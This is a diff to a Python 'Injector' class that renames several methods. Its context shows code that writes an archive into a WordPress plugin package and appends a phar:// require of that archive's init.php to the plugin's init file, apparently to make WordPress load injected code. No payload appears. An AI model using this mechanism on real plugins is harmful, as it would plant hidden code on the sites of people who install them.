@@ -50,9 +50,9 @@ class Injector:
         self.plugin.write(archive, path.join(self.plugin_root, archive_file_name))
 
         # tries to find the by WordPress initially loaded file
-        possible_init_files = self.possible_init_files()
+        possible_init_files = self._possible_init_files()
         if len(possible_init_files) == 0:
-            init_file = self.backup_init_file()
+            init_file = self._backup_init_file()
             if init_file == None:
                 raise Exception("Could not find init file")
         else:
@@ -65,11 +65,11 @@ class Injector:
         init_data += f"""\nrequire "phar://" . dirname(__FILE__) . "/{archive_file_name}/init.php";\n"""
         self.plugin.writestr(init_file, str.encode(init_data))
 
-    def add_file(self, filename, contents):
+    def write_file(self, filename, contents):
         absolute_path = path.join(self.plugin_root, filename)
         self.plugin.writestr(absolute_path, contents)
 
-    def possible_init_files(self) -> List[str]:
+    def _possible_init_files(self) -> List[str]:
         possible_init_file_names = self.plugin_name.split("-")
 
         possible_init_files = []
@@ -86,7 +86,7 @@ class Injector:
 
         return possible_init_files
 
-    def backup_init_file(self) -> Optional[str]:
+    def _backup_init_file(self) -> Optional[str]:
         possible_init_files = list(
             filter(
                 lambda s: s.endswith(".php"),
